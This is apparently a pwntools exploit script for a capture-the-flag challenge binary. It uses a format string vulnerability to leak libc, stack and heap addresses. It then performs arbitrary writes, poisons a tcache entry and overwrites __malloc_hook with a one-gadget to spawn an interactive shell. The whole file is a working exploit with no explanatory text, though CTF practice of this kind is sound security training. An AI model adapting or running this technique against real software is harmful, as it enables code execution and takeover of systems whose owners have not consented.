from pwn import *


binpath = './chall'
elf = ELF(binpath)
libc = elf.libc


context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']
# context.log_level = 'DEBUG'


gdbscript = """
gef
# b grimoire_open
# b grimoire_edit
# b error
# just before fprintf
# b *(0x0000555555554000+0xEC5)
# malloc
b *0x0000555555554e67
ignore 1 148
c
"""
io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)


def open_book():
    io.sendlineafter(b'> ', b'1')


def open_lost_book():
    io.sendlineafter(b'> ', b'1')
    # data = io.recvuntil(b':').rstrip(b':')
    data = io.recvline()
    data = data[:data.rfind(b':')]
    return data


def read_book():
    io.sendlineafter(b'> ', b'2')
    io.recvline()
    data = io.recvuntil(b'*')
    io.recvline()
    return data


def edit_book(offset, data):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'Offset: ', b'%d' % offset)
    io.sendafter(b'Text: ', data)


def fsb(fmt):
    payload = b''
    payload += p64(0)  # NULL out fp
    payload += p64(1)  # init
    payload += p64(0) * 2  # pad
    payload += fmt
    payload += b'x\00'
    edit_book(0x200, payload)
    return open_lost_book()


open_book()
read_book()

# allocate & free 0x120 chunk
print(fsb(b'A' * 0x100))

addr_libc = int(fsb(b'%22$p\x00'), 16) - 0x21b97
print("addr_libc = 0x{:x}".format(addr_libc))
print("addr_malloc_hook = 0x{:x}".format(addr_libc + libc.symbols['__malloc_hook']))

addr_stack = int(fsb(b'%11$p\x00'), 16)
addr_addr_libc = addr_stack + 0x28
print('addr_stack = 0x{:x}'.format(addr_stack))
print('addr_addr_libc = 0x{:x}'.format(addr_addr_libc))


addr_heap = int(fsb(b'%9$p\x00'), 16) - 0x1800
print('addr_heap + ' + hex(addr_heap))
addr_target = addr_heap + 0xd8


gadget_offsets = [324293, 324386, 1090444]
addr_gadget = addr_libc + gadget_offsets[0]

print("addr_gadget = 0x{:x} ({})".format(addr_gadget, addr_gadget))


def create_on_stack(x):
    # print('addr_addr_libc = ' + hex(addr_addr_libc))
    for i in range(4):
        target = (addr_addr_libc + i * 2) & 0xffff
        if target == 0:
            write = b'65536'
        else:
            write = b'%d' % target
        fmt = b'%' + write + b'c%24$hn'
        fsb(fmt)

        target = (x >> (i * 16)) & 0xffff
        if target == 0:
            write = b'65536'
        else:
            write = b'%d' % target
        fmt = b'%' + write + b'c%50$hn'
        fsb(fmt)


def arb_write(addr, val):
    create_on_stack(addr)
    index = 22
    for i in range(4):
        create_on_stack(addr + i * 2)
        target = ((val >> (i * 16)) & 0xffff)
        if target == 0:
            write = b'65536'
        else:
            write = b'%d' % target
        # print(fsb(b'%22$p\x00'))
        fsb(b'%22$p\x00')
        fmt = b'%' + write + b'c%22$hn\x00'
        fsb(fmt)
        # fsb(b'%100c%22$hn\x00')


print("Overwrite tcache entry")
print("We cannot directly overwrite __malloc_hook (or __free_hook) with arb_write,")
print("since then __malloc_hook will be called when it only has 2 bytes in it")
arb_write(addr_target, addr_libc + libc.symbols['__malloc_hook'] - 0x100)
# overwrite size of chunk
arb_write(addr_libc + libc.symbols['__malloc_hook'] - 0x100 - 0x8, 0x131)
# overwrite next chunk's prev_in_use
arb_write(addr_libc + libc.symbols['__malloc_hook'] - 0x100 - 0x8 + 0x130, 0x31)

print("Overwrite __malloc_hook")
fsb(b'B' * 0x100 + p64(addr_gadget))
# fsb(p64(addr_gadget) + b'B' * 0xf8)

print("malloc again to open shell")
fsb(b'C' * 0x100)


io.interactive()
